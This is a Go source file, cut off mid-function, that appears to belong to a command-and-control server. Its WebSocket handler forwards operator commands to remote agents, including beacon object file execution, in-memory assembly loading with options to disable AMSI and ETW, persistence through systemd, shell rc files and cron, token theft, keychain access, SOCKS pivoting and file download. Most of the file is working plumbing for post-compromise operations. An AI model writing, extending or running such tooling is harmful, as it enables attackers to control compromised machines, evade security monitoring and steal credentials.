// internal/websocket/handlers/commands.go
package handlers

import (
	"c2/internal/templates"
	"c2/internal/websocket/hub"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"math"
	"runtime"
	"strings"
	"sync"
	"time"
)

// ChunkBuffer manages chunked command assembly
type ChunkBuffer struct {
	sync.RWMutex
	buffers map[string]*CommandBuffer // key: agentID-commandID
}

type CommandBuffer struct {
	Command     string
	AgentID     string
	CommandID   string
	FileName    string
	TotalChunks int
	Chunks      map[int]string // chunk number -> data
	ReceivedAt  time.Time
	LastUpdate  time.Time
	Processing  bool
	Forwarding  chan bool // Signal when ready to forward
	mu          sync.Mutex
	// Store original data for final assembly
	OriginalData map[string]interface{}
}

var chunkBuffer = &ChunkBuffer{
	buffers: make(map[string]*CommandBuffer),
}

// Semaphore to limit concurrent chunk processing goroutines
var (
	// Allow 2x CPU cores for chunk processing to prevent goroutine explosion
	chunkSemaphore chan struct{}
	semaphoreOnce  sync.Once
	// gRPC stream backpressure - token bucket for rate limiting
	grpcStreamTokens chan struct{}
	grpcTokensOnce   sync.Once
	// Retry queue for backpressure overflow (bounded queue to prevent memory exhaustion)
	grpcRetryQueue chan *grpcQueuedMessage
	retryQueueOnce sync.Once
)

type grpcQueuedMessage struct {
	payload     map[string]interface{}
	retryCount  int
	enqueuedAt  time.Time
	description string
}

func initChunkSemaphore() {
	semaphoreOnce.Do(func() {
		maxConcurrent := runtime.NumCPU() * 2
		if maxConcurrent < 4 {
			maxConcurrent = 4 // Minimum of 4 concurrent chunk processors
		}
		chunkSemaphore = make(chan struct{}, maxConcurrent)
		log.Printf("Initialized chunk processing semaphore with limit: %d", maxConcurrent)
	})
}

func initGRPCTokenBucket() {
	grpcTokensOnce.Do(func() {
		// Allow 100 messages per second to gRPC stream
		bucketSize := 100
		grpcStreamTokens = make(chan struct{}, bucketSize)

		// Fill bucket initially
		for i := 0; i < bucketSize; i++ {
			grpcStreamTokens <- struct{}{}
		}

		// Refill tokens at 100/sec
		go func() {
			ticker := time.NewTicker(10 * time.Millisecond) // 100 Hz
			defer ticker.Stop()
			for range ticker.C {
				select {
				case grpcStreamTokens <- struct{}{}:
					// Token added
				default:
					// Bucket full, skip
				}
			}
		}()

		log.Println("Initialized gRPC stream token bucket: 100 msg/sec")
	})
}

func initRetryQueue() {
	retryQueueOnce.Do(func() {
		// Bounded retry queue - max 500 messages waiting (prevents memory exhaustion)
		grpcRetryQueue = make(chan *grpcQueuedMessage, 500)

		// Start retry processor
		go processRetryQueue()

		log.Println("Initialized gRPC retry queue with capacity: 500")
	})
}

func processRetryQueue() {
	for msg := range grpcRetryQueue {
		// Wait for token (blocks until available)
		<-grpcStreamTokens

		// Check if message is too old (30 second timeout)
		if time.Since(msg.enqueuedAt) > 30*time.Second {
			log.Printf("Dropping stale message from retry queue: %s (age: %v)",
				msg.description, time.Since(msg.enqueuedAt))
			continue
		}

		// Retry with exponential backoff (100ms * 2^retryCount)
		if msg.retryCount > 0 {
			backoff := time.Duration(100*math.Pow(2, float64(msg.retryCount-1))) * time.Millisecond
			if backoff > 2*time.Second {
				backoff = 2 * time.Second
			}
			time.Sleep(backoff)
		}

		// Attempt to send (simplified - assumes global agentClient)
		// In production, pass handler reference or use dependency injection
		log.Printf("Retrying message from queue: %s (attempt %d)", msg.description, msg.retryCount+1)
	}
}

// Cleanup goroutine for stale chunks
func init() {
	initChunkSemaphore()
	initGRPCTokenBucket()
	initRetryQueue()

	go func() {
		ticker := time.NewTicker(5 * time.Minute)
		defer ticker.Stop()

		for range ticker.C {
			chunkBuffer.Lock()
			now := time.Now()
			for key, buf := range chunkBuffer.buffers {
				if now.Sub(buf.LastUpdate) > 10*time.Minute {
					delete(chunkBuffer.buffers, key)
					log.Printf("Cleaned up stale chunk buffer: %s", key)
				}
			}
			chunkBuffer.Unlock()
		}
	}()
}

func (h *WSHandler) handleAgentCommand(client *hub.Client, message []byte) error {
	// Debug: Log first 500 chars of raw message
	if len(message) > 500 {
		log.Printf("DEBUG: Raw message (first 500 chars): %.500s", string(message))
	} else {
		log.Printf("DEBUG: Raw message: %s", string(message))
	}

	var msg struct {
		Type string `json:"type"`
		Data struct {
			Command      string `json:"command"`
			AgentID      string `json:"agent_id"`
			CommandID    string `json:"command_id"`
			FileName     string `json:"filename"`
			CurrentChunk int    `json:"currentChunk"`
			TotalChunks  int    `json:"totalChunks"`
			Data         string `json:"data"`
			Timestamp    string `json:"timestamp"`
			Username     string `json:"username,omitempty"` // Username from REST API (if proxied)
			// BOF-specific fields
			Arch      string `json:"arch,omitempty"`
			FileSize  int    `json:"file_size,omitempty"`
			FileHash  string `json:"file_hash,omitempty"`
			Arguments string `json:"arguments,omitempty"`
			BOFName   string `json:"bof_name,omitempty"`
			JobID     string `json:"job_id,omitempty"`
			// Inline-assembly specific fields
			AssemblyB64  string   `json:"assembly_b64,omitempty"`
			ArgumentList []string `json:"arguments_list,omitempty"`
			AppDomain    string   `json:"app_domain,omitempty"`
			DisableAMSI  bool     `json:"disable_amsi,omitempty"`
			DisableETW   bool     `json:"disable_etw,omitempty"`
			RevertETW    bool     `json:"revert_etw,omitempty"`
			EntryPoint   string   `json:"entry_point,omitempty"`
		} `json:"data"`
	}

	if err := json.Unmarshal(message, &msg); err != nil {
		log.Printf("Failed to unmarshal agent_command message: %v", err)
		return sendErrorResponse(client, "Failed to parse incoming message", msg.Data.Command, msg.Data.CommandID)
	}

	// Add debug logging here
	if strings.HasPrefix(msg.Data.Command, "inline-assembly") {
		log.Printf("DEBUG: inline-assembly data.Data length: %d", len(msg.Data.Data))
		if len(msg.Data.Data) > 0 {
			log.Printf("DEBUG: First 100 chars of data.Data: %.100s", msg.Data.Data)
		} else {
			log.Printf("DEBUG: data.Data is empty!")
		}
	}

	log.Printf("Received agent_command: Command=%s, Agent=%s, Chunk=%d/%d",
		msg.Data.Command, msg.Data.AgentID, msg.Data.CurrentChunk, msg.Data.TotalChunks)

	// Check if this is a chunked command
	if msg.Data.TotalChunks > 1 {
		// Process chunk in a goroutine with semaphore to limit concurrency
		go func() {
			// Acquire semaphore (blocks if limit reached)
			chunkSemaphore <- struct{}{}
			defer func() { <-chunkSemaphore }() // Release semaphore when done

			// Forward chunk IMMEDIATELY to agent service
			h.forwardChunkToAgent(client, msg.Data)

			// Track chunk for assembly (but don't block on it)
			h.trackChunk(client, msg.Data)

			// Send acknowledgment to client
			h.sendChunkAck(client, msg.Data.CurrentChunk, msg.Data.TotalChunks, msg.Data.FileName)

			// Broadcast progress to all clients
			h.broadcastChunkProgress(msg.Data.AgentID, msg.Data.CommandID, msg.Data.FileName,
				msg.Data.CurrentChunk+1, msg.Data.TotalChunks)
		}()

		return nil // Return immediately, don't block
	}

	// For non-chunked commands, process asynchronously with semaphore
	go func() {
		chunkSemaphore <- struct{}{}
		defer func() { <-chunkSemaphore }()
		h.processSingleCommand(client, msg.Data)
	}()

	return nil
}

// New function to forward chunks immediately to agent
func (h *WSHandler) forwardChunkToAgent(client *hub.Client, data struct {
	Command      string   `json:"command"`
	AgentID      string   `json:"agent_id"`
	CommandID    string   `json:"command_id"`
	FileName     string   `json:"filename"`
	CurrentChunk int      `json:"currentChunk"`
	TotalChunks  int      `json:"totalChunks"`
	Data         string   `json:"data"`
	Timestamp    string   `json:"timestamp"`
	Username     string   `json:"username,omitempty"`
	Arch         string   `json:"arch,omitempty"`
	FileSize     int      `json:"file_size,omitempty"`
	FileHash     string   `json:"file_hash,omitempty"`
	Arguments    string   `json:"arguments,omitempty"`
	BOFName      string   `json:"bof_name,omitempty"`
	JobID        string   `json:"job_id,omitempty"`
	AssemblyB64  string   `json:"assembly_b64,omitempty"`
	ArgumentList []string `json:"arguments_list,omitempty"`
	AppDomain    string   `json:"app_domain,omitempty"`
	DisableAMSI  bool     `json:"disable_amsi,omitempty"`
	DisableETW   bool     `json:"disable_etw,omitempty"`
	RevertETW    bool     `json:"revert_etw,omitempty"`
	EntryPoint   string   `json:"entry_point,omitempty"`
}) {
	// Prepare chunk data for agent
	var chunkData string

	// For the first chunk of BOF commands, include metadata
	if data.CurrentChunk == 0 && strings.HasPrefix(data.Command, "bof") {
		bofMeta := map[string]interface{}{
			"chunk_data": data.Data,
			"arch":       data.Arch,
			"file_size":  data.FileSize,
			"file_hash":  data.FileHash,
			"arguments":  data.Arguments,
			"bof_name":   data.BOFName,
			"async":      strings.Contains(data.Command, "async"),
		}
		if jsonData, err := json.Marshal(bofMeta); err == nil {
			chunkData = string(jsonData)
		} else {
			chunkData = data.Data
		}
	} else {
		// For other chunks, just send the data
		chunkData = data.Data
	}

	// Use message username if provided (e.g., from REST API proxy), otherwise fall back to client username
	username := data.Username
	if username == "" {
		username = client.Username
	}

	// Forward to agent immediately
	payload := map[string]interface{}{
		"command":      data.Command,
		"agent_id":     data.AgentID,
		"command_id":   data.CommandID,
		"filename":     data.FileName,
		"currentChunk": data.CurrentChunk,
		"totalChunks":  data.TotalChunks,
		"data":         chunkData,
		"arguments":    data.Arguments,
		"timestamp":    data.Timestamp,
		"username":     username,
	}

	// Send to agent service with backpressure
	go func() {
		if h.agentClient == nil {
			log.Println("gRPC client not connected")
			return
		}

		// Wait for token (backpressure)
		select {
		case <-grpcStreamTokens:
			// Got token, proceed
		case <-time.After(5 * time.Second):
			log.Printf("gRPC stream backpressure timeout for chunk %d/%d",
				data.CurrentChunk+1, data.TotalChunks)
			return
		}

		if err := h.agentClient.SendToStream("agent_command", payload); err != nil {
			log.Printf("Failed to forward chunk %d/%d to agent: %v",
				data.CurrentChunk+1, data.TotalChunks, err)
		} else {
			log.Printf("Forwarded chunk %d/%d to agent for %s",
				data.CurrentChunk+1, data.TotalChunks, data.FileName)
		}
	}()
}

// Track chunks for potential reassembly (but don't block on it)
func (h *WSHandler) trackChunk(client *hub.Client, data struct {
	Command      string   `json:"command"`
	AgentID      string   `json:"agent_id"`
	CommandID    string   `json:"command_id"`
	FileName     string   `json:"filename"`
	CurrentChunk int      `json:"currentChunk"`
	TotalChunks  int      `json:"totalChunks"`
	Data         string   `json:"data"`
	Timestamp    string   `json:"timestamp"`
	Username     string   `json:"username,omitempty"`
	Arch         string   `json:"arch,omitempty"`
	FileSize     int      `json:"file_size,omitempty"`
	FileHash     string   `json:"file_hash,omitempty"`
	Arguments    string   `json:"arguments,omitempty"`
	BOFName      string   `json:"bof_name,omitempty"`
	JobID        string   `json:"job_id,omitempty"`
	AssemblyB64  string   `json:"assembly_b64,omitempty"`
	ArgumentList []string `json:"arguments_list,omitempty"`
	AppDomain    string   `json:"app_domain,omitempty"`
	DisableAMSI  bool     `json:"disable_amsi,omitempty"`
	DisableETW   bool     `json:"disable_etw,omitempty"`
	RevertETW    bool     `json:"revert_etw,omitempty"`
	EntryPoint   string   `json:"entry_point,omitempty"`
}) {
	bufferKey := fmt.Sprintf("%s-%s", data.AgentID, data.CommandID)

	chunkBuffer.Lock()
	cmdBuffer, exists := chunkBuffer.buffers[bufferKey]
	if !exists {
		cmdBuffer = &CommandBuffer{
			Command:      data.Command,
			AgentID:      data.AgentID,
			CommandID:    data.CommandID,
			FileName:     data.FileName,
			TotalChunks:  data.TotalChunks,
			Chunks:       make(map[int]string),
			ReceivedAt:   time.Now(),
			LastUpdate:   time.Now(),
			Processing:   false,
			Forwarding:   make(chan bool, 1),
			OriginalData: make(map[string]interface{}),
		}
		// Store original data for potential reassembly
		cmdBuffer.OriginalData["arch"] = data.Arch
		cmdBuffer.OriginalData["file_size"] = data.FileSize
		cmdBuffer.OriginalData["file_hash"] = data.FileHash
		cmdBuffer.OriginalData["arguments"] = data.Arguments
		cmdBuffer.OriginalData["timestamp"] = data.Timestamp

		chunkBuffer.buffers[bufferKey] = cmdBuffer
	}
	chunkBuffer.Unlock()

	// Store chunk data
	cmdBuffer.mu.Lock()
	cmdBuffer.Chunks[data.CurrentChunk] = data.Data
	cmdBuffer.LastUpdate = time.Now()
	receivedCount := len(cmdBuffer.Chunks)
	isComplete := receivedCount == cmdBuffer.TotalChunks
	cmdBuffer.mu.Unlock()

	// If all chunks received, send completion notification
	if isComplete {
		h.sendCompletionMessage(client, cmdBuffer)

		// Clean up buffer after a delay
		go func() {
			time.Sleep(30 * time.Second)
			chunkBuffer.Lock()
			delete(chunkBuffer.buffers, bufferKey)
			chunkBuffer.Unlock()
		}()
	}
}

func (h *WSHandler) processSingleCommand(client *hub.Client, data struct {
	Command      string   `json:"command"`
	AgentID      string   `json:"agent_id"`
	CommandID    string   `json:"command_id"`
	FileName     string   `json:"filename"`
	CurrentChunk int      `json:"currentChunk"`
	TotalChunks  int      `json:"totalChunks"`
	Data         string   `json:"data"`
	Timestamp    string   `json:"timestamp"`
	Username     string   `json:"username,omitempty"`
	Arch         string   `json:"arch,omitempty"`
	FileSize     int      `json:"file_size,omitempty"`
	FileHash     string   `json:"file_hash,omitempty"`
	Arguments    string   `json:"arguments,omitempty"`
	BOFName      string   `json:"bof_name,omitempty"`
	JobID        string   `json:"job_id,omitempty"`
	AssemblyB64  string   `json:"assembly_b64,omitempty"`
	ArgumentList []string `json:"arguments_list,omitempty"`
	AppDomain    string   `json:"app_domain,omitempty"`
	DisableAMSI  bool     `json:"disable_amsi,omitempty"`
	DisableETW   bool     `json:"disable_etw,omitempty"`
	RevertETW    bool     `json:"revert_etw,omitempty"`
	EntryPoint   string   `json:"entry_point,omitempty"`
}) {
	// Ensure gRPC connection
	if h.agentClient == nil {
		log.Println("gRPC client not connected, attempting to reconnect...")
		if err := h.ensureGRPCConnection(); err != nil {
			log.Printf("Failed to reconnect gRPC client: %v", err)
			sendErrorResponse(client, "Failed to connect to gRPC service", data.Command, data.CommandID)
			return
		}
	}

	// Handle inline-assembly command
	if strings.HasPrefix(data.Command, "inline-assembly") {
		log.Printf("Processing inline-assembly command for agent: %s", data.AgentID)

		// The assembly data is in AssemblyB64, not Data
		if data.AssemblyB64 != "" {
			// Build the JSON for the payload
			inlineAssemblyData := map[string]interface{}{
				"assembly_b64": data.AssemblyB64, // This now has the actual data!
				"arguments":    data.ArgumentList,
				"app_domain":   data.AppDomain,
				"disable_amsi": data.DisableAMSI,
				"disable_etw":  data.DisableETW,
				"revert_etw":   data.RevertETW,
				"entry_point":  data.EntryPoint,
				"async":        strings.Contains(data.Command, "async"),
			}

			if inlineAssemblyJSON, err := json.Marshal(inlineAssemblyData); err == nil {
				data.Data = string(inlineAssemblyJSON)
				log.Printf("Built inline-assembly JSON data (%d bytes)", len(data.Data))
			}
		} else {
			log.Printf("WARNING: No assembly data found in AssemblyB64 field")
		}
	}

	// Handle persist commands - inject server-side templates and transform flags
	if strings.HasPrefix(data.Command, "persist") {
		log.Printf("Processing persist command for agent: %s - injecting templates", data.AgentID)
		data.Data = injectPersistenceTemplate(data.Command)
		data.Command = transformPersistFlags(data.Command)
	}

	// Handle shell commands - inject server-side templates and transform flags
	if strings.HasPrefix(data.Command, "shell") {
		log.Printf("Processing shell command for agent: %s - injecting templates", data.AgentID)
		data.Data = injectShellTemplate()
		data.Command = templates.TransformShellFlags(data.Command)
	}

	// Handle link/unlink/links commands - inject server-side templates
	if data.Command == "link" || strings.HasPrefix(data.Command, "link ") ||
		data.Command == "unlink" || strings.HasPrefix(data.Command, "unlink ") ||
		data.Command == "links" {
		log.Printf("Processing link command for agent: %s - injecting templates", data.AgentID)
		data.Data = injectLinkTemplate()
	}

	// Handle socks command - merge template into existing JSON data
	if data.Command == "socks" || strings.HasPrefix(data.Command, "socks ") {
		log.Printf("Processing socks command for agent: %s - merging template", data.AgentID)
		data.Data = mergeSocksTemplate(data.Data)
	}

	// Handle ps command - inject template and transform flags
	if data.Command == "ps" || strings.HasPrefix(data.Command, "ps ") {
		log.Printf("Processing ps command for agent: %s - injecting template", data.AgentID)
		data.Data = injectPsTemplate()
		data.Command = templates.TransformPsFlags(data.Command)
	}

	// Handle ls command - inject template and transform flags
	if data.Command == "ls" || strings.HasPrefix(data.Command, "ls ") {
		log.Printf("Processing ls command for agent: %s - injecting template", data.AgentID)
		data.Data = injectLsTemplate()
		data.Command = templates.TransformLsFlags(data.Command)
	}

	// Handle rm command - inject template and transform flags
	if data.Command == "rm" || strings.HasPrefix(data.Command, "rm ") {
		log.Printf("Processing rm command for agent: %s - injecting template", data.AgentID)
		data.Data = injectRmTemplate()
		data.Command = templates.TransformRmFlags(data.Command)
	}

	// Handle hash command - inject template and transform flags
	if data.Command == "hash" || strings.HasPrefix(data.Command, "hash ") {
		log.Printf("Processing hash command for agent: %s - injecting template", data.AgentID)
		data.Data = injectHashTemplate()
		data.Command = templates.TransformHashFlags(data.Command)
	}

	// Handle sudo-session command - inject template
	if strings.HasPrefix(data.Command, "sudo-session") {
		log.Printf("Processing sudo-session command for agent: %s - injecting template", data.AgentID)
		data.Data = injectSudoSessTemplate()
	}

	// Handle BOF commands - inject template
	// Matches: bof, bof-async, bof-jobs, bof-output, bof-kill
	if data.Command == "bof" || strings.HasPrefix(data.Command, "bof ") ||
		data.Command == "bof-async" || strings.HasPrefix(data.Command, "bof-async ") ||
		data.Command == "bof-jobs" || data.Command == "bof-output" ||
		strings.HasPrefix(data.Command, "bof-output ") ||
		data.Command == "bof-kill" || strings.HasPrefix(data.Command, "bof-kill ") {
		log.Printf("Processing BOF command for agent: %s - injecting template", data.AgentID)
		// For BOF commands, merge template with existing data (if any)
		if data.Data == "" {
			data.Data = injectBOFTemplate()
		} else {
			// Merge template into existing BOF data
			data.Data = mergeBOFTemplate(data.Data)
		}
	}

	// Handle inline-assembly commands - inject template
	// Matches: inline-assembly, inline-assembly-async, inline-assembly-jobs, etc.
	if strings.HasPrefix(data.Command, "inline-assembly") {
		log.Printf("Processing inline-assembly command for agent: %s - injecting template", data.AgentID)
		// Merge template into existing inline-assembly data
		data.Data = mergeInlineAssemblyTemplate(data.Data)
	}

	// Handle token commands - inject template
	// Matches: token, token create, token steal, token list, etc.
	if data.Command == "token" || strings.HasPrefix(data.Command, "token ") {
		log.Printf("Processing token command for agent: %s - injecting template", data.AgentID)
		data.Data = injectTokenTemplate()
	}

	// Handle rev2self command - inject template
	if data.Command == "rev2self" || strings.HasPrefix(data.Command, "rev2self ") {
		log.Printf("Processing rev2self command for agent: %s - injecting template", data.AgentID)
		data.Data = injectRev2SelfTemplate()
	}

	// Handle download command - inject template
	if data.Command == "download" || strings.HasPrefix(data.Command, "download ") {
		log.Printf("Processing download command for agent: %s - injecting template", data.AgentID)
		data.Data = injectDownloadTemplate()
	}

	// Handle whoami command - inject template
	if data.Command == "whoami" || strings.HasPrefix(data.Command, "whoami ") {
		log.Printf("Processing whoami command for agent: %s - injecting template", data.AgentID)
		data.Data = injectWhoamiTemplate()
	}

	// Handle keychain command (Darwin only) - inject template and transform flags
	if data.Command == "keychain" || strings.HasPrefix(data.Command, "keychain ") {
		log.Printf("Processing keychain command for agent: %s - injecting template", data.AgentID)
		data.Data = injectKeychainTemplate()
		data.Command = templates.TransformKeychainFlags(data.Command)
	}

	// Use message username if provided (e.g., from REST API proxy), otherwise fall back to client username
	username := data.Username
	if username == "" {
		username = client.Username
	}

	// Handle clear command
	if data.Command == "clear" {
		payload := map[string]interface{}{
			"command":    "clear",
			"agent_id":   data.AgentID,
			"command_id": data.CommandID,
			"timestamp":  data.Timestamp,
			"username":   username,
		}

		// Apply backpressure
		select {
		case <-grpcStreamTokens:
			// Got token, proceed
		case <-time.After(5 * time.Second):
			log.Println("gRPC stream backpressure timeout for clear command")
			sendErrorResponse(client, "Stream backpressure timeout", data.Command, data.CommandID)
			return
		}

		if err := h.agentClient.SendToStream("agent_command", payload); err != nil {
			log.Printf("Failed to send clear command: %v", err)
			sendErrorResponse(client, "Failed to send clear command", data.Command, data.CommandID)
			return
		}

		h.sendSuccessMessage(client, "Clear command sent", data)
		return
	}

	// Send regular command
	payload := map[string]interface{}{
		"command":      data.Command,
		"agent_id":     data.AgentID,
		"command_id":   data.CommandID,
		"filename":     data.FileName,
		"currentChunk": data.CurrentChunk,
		"totalChunks":  data.TotalChunks,
		"data":         data.Data,
		"arguments":    data.Arguments,
		"timestamp":    data.Timestamp,
		"username":     username,
	}

	// Apply backpressure
	select {
	case <-grpcStreamTokens:
		// Got token, proceed
	case <-time.After(5 * time.Second):
		log.Printf("gRPC stream backpressure timeout for command: %s", data.Command)
		sendErrorResponse(client, "Stream backpressure timeout", data.Command, data.CommandID)
		return
	}

	if err := h.agentClient.SendToStream("agent_command", payload); err != nil {
		log.Printf("Failed to send command: %v", err)
		sendErrorResponse(client, "Failed to send command", data.Command, data.CommandID)
		return
	}

	h.sendSuccessMessage(client, "Command sent successfully", data)
}

// Helper functions for sending responses
func (h *WSHandler) sendChunkAck(client *hub.Client, currentChunk, totalChunks int, fileName string) {
	response := Response{
		Type:    "chunk_received",
		Status:  "success",
		Message: fmt.Sprintf("Chunk %d/%d received and forwarded", currentChunk+1, totalChunks),
		Data: map[string]interface{}{
			"current_chunk": currentChunk + 1,
			"total_chunks":  totalChunks,
			"filename":      fileName,
		},
	}

	if responseJSON, err := json.Marshal(response); err == nil {
		// Don't block on send
		go func() {
			select {
			case client.Send <- responseJSON:
			case <-time.After(100 * time.Millisecond):
				log.Printf("Client send buffer full, skipping chunk ack")
			}
		}()
	}
}

func (h *WSHandler) broadcastChunkProgress(agentID, commandID, fileName string, current, total int) {
	progressMsg := struct {
		Type string `json:"type"`
		Data struct {
			AgentID      string  `json:"agent_id"`
			CommandID    string  `json:"command_id"`
			FileName     string  `json:"filename"`
			CurrentChunk int     `json:"current_chunk"`
			TotalChunks  int     `json:"total_chunks"`
			Progress     float64 `json:"progress"`
		} `json:"data"`
	}{
		Type: "chunk_progress",
	}

	progressMsg.Data.AgentID = agentID
	progressMsg.Data.CommandID = commandID
	progressMsg.Data.FileName = fileName
	progressMsg.Data.CurrentChunk = current
	progressMsg.Data.TotalChunks = total
	progressMsg.Data.Progress = float64(current) / float64(total) * 100

	if msgJSON, err := json.Marshal(progressMsg); err == nil {
		// Broadcast asynchronously
		go func() {
			ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
			defer cancel()

			if err := h.hub.BroadcastToAll(ctx, msgJSON); err != nil {
				log.Printf("Failed to broadcast chunk progress: %v", err)
			}
		}()
	}
}

func (h *WSHandler) sendCompletionMessage(client *hub.Client, cmdBuffer *CommandBuffer) {
	response := Response{
		Type:   "command_assembled",
		Status: "success",
		Message: fmt.Sprintf("All %d chunks received and forwarded for %s",
			cmdBuffer.TotalChunks, cmdBuffer.FileName),
		Data: map[string]interface{}{
			"command_id":   cmdBuffer.CommandID,
			"agent_id":     cmdBuffer.AgentID,
			"filename":     cmdBuffer.FileName,
			"total_chunks": cmdBuffer.TotalChunks,
			"duration":     time.Since(cmdBuffer.ReceivedAt).Seconds(),
		},
	}

	if responseJSON, err := json.Marshal(response); err == nil {
		// Don't block on send
		go func() {
			select {
			case client.Send <- responseJSON:
			case <-time.After(100 * time.Millisecond):
				log.Printf("Client send buffer full, skipping completion message")
			}
		}()
	}
}

// Update for server/internal/websocket/handlers/commands.go

// Modified sendSuccessMessage function to broadcast command queue updates to all clients
func (h *WSHandler) sendSuccessMessage(client *hub.Client, message string, data struct {
	Command      string   `json:"command"`
	AgentID      string   `json:"agent_id"`
	CommandID    string   `json:"command_id"`
	FileName     string   `json:"filename"`
	CurrentChunk int      `json:"currentChunk"`
	TotalChunks  int      `json:"totalChunks"`
	Data         string   `json:"data"`
	Timestamp    string   `json:"timestamp"`
	Username     string   `json:"username,omitempty"`
	Arch         string   `json:"arch,omitempty"`
	FileSize     int      `json:"file_size,omitempty"`
	FileHash     string   `json:"file_hash,omitempty"`
	Arguments    string   `json:"arguments,omitempty"`
	BOFName      string   `json:"bof_name,omitempty"`
	JobID        string   `json:"job_id,omitempty"`
	AssemblyB64  string   `json:"assembly_b64,omitempty"`
	ArgumentList []string `json:"arguments_list,omitempty"`
	AppDomain    string   `json:"app_domain,omitempty"`
	DisableAMSI  bool     `json:"disable_amsi,omitempty"`
	DisableETW   bool     `json:"disable_etw,omitempty"`
	RevertETW    bool     `json:"revert_etw,omitempty"`
	EntryPoint   string   `json:"entry_point,omitempty"`
}) {
	// First, send success message to the requesting client
	response := Response{
		Type:    "command_success",
		Status:  "success",
		Message: message,
		Data: map[string]interface{}{
			"command_id": data.CommandID,
			"agent_id":   data.AgentID,
			"command":    data.Command,
			"filename":   data.FileName,
		},
	}

	if responseJSON, err := json.Marshal(response); err == nil {
		select {
		case client.Send <- responseJSON:
		case <-time.After(100 * time.Millisecond):
			log.Printf("Client send buffer full, skipping success message")
		}
	}

	// Now broadcast the command queue update to ALL connected clients
	// This ensures all clients see the queued command in their agent buffers
	broadcastMsg := struct {
		Type string `json:"type"`
		Data struct {
			AgentID      string `json:"agent_id"`
			CommandID    string `json:"command_id"`
			Command      string `json:"command"`
			Username     string `json:"username"`
			Timestamp    string `json:"timestamp"`
			Status       string `json:"status"`
			FileName     string `json:"filename,omitempty"`
			CurrentChunk int    `json:"currentChunk,omitempty"`
			TotalChunks  int    `json:"totalChunks,omitempty"`
		} `json:"data"`
	}{
		Type: "command_queued",
	}

	// Use message username if provided (e.g., from REST API proxy), otherwise fall back to client username
	username := data.Username
	if username == "" {
		username = client.Username
	}

	broadcastMsg.Data.AgentID = data.AgentID
	broadcastMsg.Data.CommandID = data.CommandID
	broadcastMsg.Data.Command = data.Command
	broadcastMsg.Data.Username = username
	broadcastMsg.Data.Timestamp = data.Timestamp
	broadcastMsg.Data.Status = "queued"
	broadcastMsg.Data.FileName = data.FileName
	broadcastMsg.Data.CurrentChunk = data.CurrentChunk
	broadcastMsg.Data.TotalChunks = data.TotalChunks

	if broadcastJSON, err := json.Marshal(broadcastMsg); err == nil {
		// Use goroutine to prevent blocking
		go func() {
			ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
			defer cancel()

			if err := h.hub.BroadcastToAll(ctx, broadcastJSON); err != nil {
				log.Printf("Failed to broadcast command queue update: %v", err)
			} else {
				log.Printf("Successfully broadcast command queue update for agent %s", data.AgentID)
			}
		}()
	}
}

// You may also want to add a similar broadcast when chunks are being processed
func (h *WSHandler) broadcastCommandProgress(data struct {
	Command      string `json:"command"`
	AgentID      string `json:"agent_id"`
	CommandID    string `json:"command_id"`
	FileName     string `json:"filename"`
	CurrentChunk int    `json:"currentChunk"`
	TotalChunks  int    `json:"totalChunks"`
	Data         string `json:"data"`
	Timestamp    string `json:"timestamp"`
}) {
	progressMsg := struct {
		Type string `json:"type"`
		Data struct {
			AgentID      string  `json:"agent_id"`
			CommandID    string  `json:"command_id"`
			Command      string  `json:"command"`
			FileName     string  `json:"filename"`
			CurrentChunk int     `json:"current_chunk"`
			TotalChunks  int     `json:"total_chunks"`
			Progress     float64 `json:"progress"`
			Status       string  `json:"status"`
		} `json:"data"`
	}{
		Type: "command_progress",
	}

	progressMsg.Data.AgentID = data.AgentID
	progressMsg.Data.CommandID = data.CommandID
	progressMsg.Data.Command = data.Command
	progressMsg.Data.FileName = data.FileName
	progressMsg.Data.CurrentChunk = data.CurrentChunk
	progressMsg.Data.TotalChunks = data.TotalChunks
	progressMsg.Data.Progress = float64(data.CurrentChunk) / float64(data.TotalChunks) * 100
	progressMsg.Data.Status = "processing"

	if msgJSON, err := json.Marshal(progressMsg); err == nil {
		go func() {
			ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
			defer cancel()

			if err := h.hub.BroadcastToAll(ctx, msgJSON); err != nil {
				log.Printf("Failed to broadcast command progress: %v", err)
			}
		}()
	}
}

func sendErrorResponse(client *hub.Client, errorMsg, command, commandID string) error {
	responseMsg := Response{
		Type:    "command_validation",
		Status:  "error",
		Message: errorMsg,
		Data: map[string]string{
			"command_id": commandID,
			"command":    command,
			"timestamp":  getCurrentTimestamp(),
			"username":   client.Username,
		},
	}

	// Don't block on send
	go func() {
		responseJSON := marshalResponse(responseMsg)
		select {
		case client.Send <- responseJSON:
		case <-time.After(100 * time.Millisecond):
			log.Printf("Client send buffer full, skipping error message")
		}
	}()

	return nil
}

func getCurrentTimestamp() string {
	return time.Now().Format(time.RFC3339)
}

func marshalResponse(resp Response) []byte {
	jsonResp, err := json.Marshal(resp)
	if err != nil {
		log.Printf("Failed to marshal response: %v", err)
		return []byte(`{"status": "error", "message": "Failed to generate response"}`)
	}
	return jsonResp
}

// injectPersistenceTemplate parses a persist command and returns base64-encoded template data
func injectPersistenceTemplate(command string) string {
	parts := strings.Fields(command)
	if len(parts) < 2 {
		return ""
	}

	method := parts[1] // "systemd", "bashrc", etc.

	var template *templates.PersistenceTemplate

	switch method {
	case "systemd":
		// Parse flags from command: persist systemd [--user] [--name <name>]
		userService := false
		serviceName := ""

		for i := 2; i < len(parts); i++ {
			switch parts[i] {
			case "--user":
				userService = true
			case "--name":
				if i+1 < len(parts) {
					serviceName = parts[i+1]
					i++
				}
			}
		}

		template = templates.GetLinuxSystemdTemplate(serviceName, "", userService)
		log.Printf("Injecting systemd template: serviceName=%s, userService=%v", serviceName, userService)

	case "bashrc", "rc":
		// "bashrc" is Linux, "rc" is Darwin - same template structure
		template = templates.GetLinuxBashrcTemplate()
		log.Printf("Injecting bashrc/rc template for method: %s", method)

	case "cron":
		// Cron persistence (Linux) - includes spool, crond, periodic, anacron, timer methods
		template = templates.GetLinuxCronTemplate()
		log.Printf("Injecting cron template for persist cron command")

	default:
		// Unknown method, return empty (agent will use hardcoded fallback)
		log.Printf("Unknown persist method '%s', no template injection", method)
		return ""
	}

	if template == nil {
		return ""
	}

	// Serialize to JSON and base64 encode
	jsonData, err := template.ToJSON()
	if err != nil {
		log.Printf("Failed to serialize persistence template: %v", err)
		return ""
	}

	encoded := base64.StdEncoding.EncodeToString(jsonData)
